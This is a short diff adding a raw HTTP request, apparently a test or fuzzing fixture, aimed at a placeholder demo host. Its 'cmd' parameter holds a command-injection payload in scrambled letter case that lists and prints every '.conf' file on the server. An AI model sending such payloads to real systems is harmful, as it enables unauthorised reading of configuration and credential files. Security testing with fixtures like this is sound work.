@@ -1,0 +1,4 @@
+GET /a?cmd=;%20fInD%20/%20-nAmE%20*.cOnF%20-eXeC%20cAt%20{}%20\; HTTP/1.1
+Host: demo.example.com
+Connection: close
+
